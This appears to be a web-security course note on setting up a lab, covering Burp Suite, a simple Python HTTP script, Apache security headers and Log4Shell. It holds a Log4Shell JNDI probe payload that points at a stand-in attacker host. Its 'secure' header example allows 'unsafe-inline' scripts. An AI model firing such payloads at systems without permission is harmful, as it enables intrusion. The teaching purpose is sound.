---
course: Web Security
topic: Lab Environment Setup
tags: [web-security]
---

## Session 1: Initial Reconnaissance

- Target: www.example.com
- Tools Used: Nmap, Burp Suite
- Findings:
  - Open ports: 80, 443
  - Web server: Apache/2.4.41
```

Save this file as `notes.md` in your project directory.

### Python Scripting

Python is a versatile language widely used in web security due to its simplicity and rich ecosystem of libraries. We will use Python to automate tasks such as scanning, fuzzing, and data processing.

#### Why Use Python?

- **Ease of Use**: Python's syntax is straightforward and easy to learn, making it ideal for both beginners and experienced developers.
- **Rich Ecosystem**: Python has a vast collection of libraries and frameworks, such as `requests`, `BeautifulSoup`, and `scapy`, which are useful for web security tasks.
- **Automation**: Python can automate repetitive tasks, saving time and reducing human error.

#### Setting Up Python

To set up Python for web security testing, follow these steps:

1. **Install Python**:
   - Download and install Python from the official website: [https://www.python.org/downloads/](https://www.python.org/downloads/)
   - Ensure you check the box to add Python to your PATH during installation.

2. **Install Required Libraries**:
   - Open a terminal and install the necessary libraries using pip:
     ```bash
     pip install requests beautifulsoup4 scapy
     ```

#### Example: Simple Python Script for HTTP Requests

Let's create a simple Python script to send an HTTP GET request to a target URL.

```python
import requests

def send_http_request(url):
    try:
        response = requests.get(url)
        print(f"Response status code: {response.status_code}")
        print(f"Response body: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    target_url = "http://www.example.com"
    send_http_request(target_url)
```

Save this script as `http_request.py` and run it using the following command:

```bash
python http_request.py
```

### Burp Suite Professional

Burp Suite is a comprehensive toolkit for web application security testing. It includes various tools such as Proxy, Intruder, Scanner, and Repeater, which can be used to test the security of web applications.

#### Why Use Burp Suite Professional?

- **Comprehensive Features**: Burp Suite Professional offers advanced features such as Collaborator, which can be used to detect out-of-band vulnerabilities.
- **Intruder Functionality**: The Intruder tool allows you to perform automated attacks against web applications, such as SQL injection and cross-site scripting (XSS).
- **Scanner**: The Scanner tool automatically identifies vulnerabilities in web applications, such as insecure cookies and missing security headers.

#### Setting Up Burp Suite Professional

To set up Burp Suite Professional, follow these steps:

1. **Install Burp Suite Professional**:
   - Download and install Burp Suite Professional from the official website: [https://portswigger.net/burp/pro](https://portswigger.net/burp/pro)

2. **Configure Browser Proxy**:
   - Set your browser's proxy settings to point to Burp Suite. This allows Burp Suite to intercept and analyze HTTP traffic between your browser and the target web application.

#### Example: Using Burp Suite Professional for HTTP Traffic Analysis

Let's use Burp Suite Professional to intercept and analyze HTTP traffic between your browser and a target web application.

1. **Start Burp Suite**:
   - Launch Burp Suite Professional and start the Proxy listener.

2. **Configure Browser Proxy**:
   - Set your browser's proxy settings to point to Burp Suite. For example, in Chrome, go to `Settings > Advanced > System > Open proxy settings`, and configure the proxy settings to use `localhost` on port `8080`.

3. **Intercept HTTP Traffic**:
   - Navigate to the target web application in your browser. Burp Suite will intercept the HTTP traffic and display it in the Proxy tab.

4. **Analyze HTTP Requests and Responses**:
   - Click on an intercepted request to view the full HTTP request and response. Analyze the headers and body to identify potential security issues.

#### Full HTTP Request and Response Example

Here is an example of a full HTTP request and response intercepted by Burp Suite:

```http
GET / HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

HTTP/1.1 200 OK
Date: Mon, 20 Sep 2021 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>
<head>
<title>Example Page</title>
</head>
<body>
<h1>Welcome to Example Page</h1>
<p>This is a sample page.</p>
</body>
</html>
```

### How to Prevent / Defend

#### Secure Coding Practices

To prevent common web security vulnerabilities, follow these secure coding practices:

1. **Input Validation**: Always validate user input to prevent injection attacks such as SQL injection and XSS.
2. **Use HTTPS**: Ensure that all communication between the client and server is encrypted using HTTPS.
3. **Secure Headers**: Set appropriate security headers to protect against common web vulnerabilities. For example, use the `Content-Security-Policy` header to mitigate XSS attacks.

#### Example: Secure Headers Configuration

Here is an example of configuring secure headers in an Apache server:

```apache
<IfModule mod_headers.c>
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
</IfModule>
```

#### Detection and Prevention Tools

Use tools such as Burp Suite Professional and static analysis tools like SonarQube to detect and prevent security vulnerabilities in your web applications.

### Real-World Examples

#### CVE-2021-44228 (Log4Shell)

CVE-2021-44228, also known as Log4Shell, is a critical vulnerability in the Apache Log4j library that allows attackers to execute arbitrary code on affected systems. This vulnerability was exploited in numerous real-world attacks, highlighting the importance of keeping software up to date and using tools like Burp Suite to detect and mitigate such vulnerabilities.

#### Example: Using Burp Suite to Detect Log4Shell

To detect the Log4Shell vulnerability using Burp Suite, you can use the Intruder tool to send crafted payloads that trigger the vulnerability. Here is an example of a payload that can be used to detect Log4Shell:

```plaintext
${jndi:ldap://attacker.com/a}
```

Send this payload using the Intruder tool and monitor the server's response to determine if the vulnerability is present.

### Practice Labs

For hands-on practice with web security testing, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a series of interactive labs covering various web security topics, including SQL injection, XSS, and CSRF.
- **OWASP Juice Shop**: A deliberately insecure web application designed for security training and research.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that contains a variety of security vulnerabilities.

These labs provide a safe environment to practice and improve your web security skills.

### Conclusion

Setting up your lab environment for web security testing involves choosing the right tools and configuring them properly. Visual Studio Code provides a powerful code editor for note-taking and scripting, Python offers a versatile language for automation, and Burp Suite Professional provides comprehensive tools for web application security testing. By following secure coding practices and using detection tools, you can effectively prevent and mitigate web security vulnerabilities.

By mastering these tools and techniques, you will be well-equipped to handle real-world web security challenges and contribute to building more secure web applications.

---
<!-- nav -->
[[02-Lab Environment Setup for Web Security|Lab Environment Setup for Web Security]] | [[Web Security (PortSwigger)/01-Lab Environment Setup/01-Lab Environment Setup/00-Overview|Overview]] | [[Web Security (PortSwigger)/01-Lab Environment Setup/01-Lab Environment Setup/04-Practice Questions & Answers|Practice Questions & Answers]]
